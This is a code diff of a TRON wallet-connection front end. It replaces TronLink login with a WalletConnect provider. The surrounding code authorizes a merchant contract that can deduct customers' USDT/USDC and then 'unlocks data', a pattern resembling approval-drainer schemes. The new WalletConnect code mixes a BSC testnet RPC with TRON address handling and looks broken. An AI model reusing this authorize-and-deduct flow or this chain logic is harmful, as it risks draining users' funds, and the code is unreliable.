@@ -10,7 +10,7 @@ const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
 const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
 
 // --- 狀態變數 ---
-let tronWeb;
+let tronWeb; // 保持 TronWeb
 let userAddress;
 let merchantContract;
 let usdtContract;
@@ -149,37 +149,42 @@ async function connectWalletLogic() {
     showOverlay('Connecting to wallet...'); // 修改为英文
 
     try {
-        // 1. 优先尝试 TronLink
-        if (window.tronLink && window.tronWeb) {
-            console.log("Attempting to connect to TronLink");
+        // 1. 移除 TronLink 連接邏輯
+        // 2. 尝试 WalletConnect (更通用，支持多种钱包)
+
+         // 3. 备用方案: 尝试使用 WalletConnect  (需要额外配置)
+        if (typeof window.WalletConnectProvider !== 'undefined') {
+          //   const WalletConnectProvider = window.WalletConnectProvider; // 确保已引入
             try {
-                 const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                if (res.code !== 200) {
-                    throw new Error(`TronLink connection request denied: ${res.message}`);
-                }
-                tronWeb = window.tronWeb;
-                userAddress = window.tronWeb.defaultAddress.base58;
-                provider = "TronLink";
-                 console.log("✅ 已使用 TronLink 连接，地址:", userAddress);
-                 await initializeContracts();
+                // ⚠️ 注意：你需要替换 YOUR_PROJECT_ID 为你自己的 WalletConnect 项目 ID
+                const providerWC = new WalletConnectProvider.default({  // 修正
+                    rpc: {
+                        //  替换成你需要的链的 RPC
+                         97: "https://data-seed-prebsc-1-s1.binance.org:8545/", // BSC testnet
+                    },
+                    chainId: 97, //  BSC testnet Chain ID
+                });
+                await providerWC.enable();
+                tronWeb = window.tronWeb; // Use tronWeb if available
+                 userAddress = tronWeb.address.fromHex(providerWC.accounts[0]);
+                 provider = "WalletConnect";
+                console.log("✅ 已使用 WalletConnect 连接，地址:", userAddress);
+                await initializeContracts();
                 updateConnectionUI(true, userAddress);
-                return true; // 连接成功
+                return true;
             } catch (error) {
-                console.error("TronLink 连接失败:", error);
-                // 尝试 WalletConnect 或 EVM
-                hideOverlay(); // Hide overlay on connection failure.
+                console.error("WalletConnect 连接失败:", error);
             }
         }
 
-       // 3. 完全沒有任何 Provider
+
+        // 4. 没有任何钱包可用
         showOverlay('🔴 Connection failed: No supported wallet detected. Please install MetaMask or use WalletConnect.'); // 修改为英文
-        hideOverlay();
         return false;
 
     } catch (error) {
         console.error("连接钱包时发生错误:", error);
         showOverlay(`🔴 Connection failed: ${error.message}`); // 修改为英文
-        hideOverlay(); // Hide overlay on connection failure.
         return false;
     }
 }
@@ -260,7 +265,7 @@ async function handlePostConnection() {
             showOverlay('✅ Authorization successful! Unlocking data...');
             updateContentLock(true); // 隐藏 lockedPrompt 和 blurOverlay
             await new Promise(resolve => setTimeout(resolve, 500));
-            hideOverlay();  // 确保隐藏了遮罩层
+            //hideOverlay();  // 确保隐藏了遮罩层 -- 已经在 updateContentLock中处理
         } else {
             // 授权失败
             showOverlay('🔴 Authorization failed. Please try again.');
